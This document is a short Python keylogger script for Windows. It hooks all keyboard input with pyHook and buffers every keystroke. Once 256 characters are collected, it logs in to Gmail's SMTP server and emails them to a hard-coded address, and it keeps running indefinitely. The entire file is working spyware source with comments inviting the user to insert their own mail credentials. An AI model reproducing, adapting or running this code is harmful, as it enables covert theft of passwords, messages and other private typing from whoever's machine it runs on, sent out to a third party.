#!/usr/bin/env python
import pythoncom, pyHook
import smtplib

keylog = '' # everything gets logged in this variable!

def OnKeyboardEvent(event):
	# keyboard press event capture
	global keylog
	keylog += event.Key
	if len(keylog) > 256: # check size of the keystrokes captured
		server = smtplib.SMTP('smtp.gmail.com:587')
		# from and to adress to send the mail
		fromaddr = 'wren0796@outlook.com'
		toaddr = 'wren0796@gmail.com'
		server.starttls()
		# alter this line and include your login credentials 
		server.login('your@email.com', 'your_password')
		server.sendmail(fromaddr, toaddr, keylog) # send the keystrokes
		server.close()
		keylog = '' # reset keylog to capture new keystrokes 
	return True

if __name__ == '__main__':
	# entry point
	hook_manager = pyHook.HookManager() # create a new hook manager
	hook_manager.KeyDown = OnKeyboardEvent # assign the keydown event to our custom method
	hook_manager.HookKeyboard() # hook the keyboard events
	pythoncom.PumpMessages() # run forever!
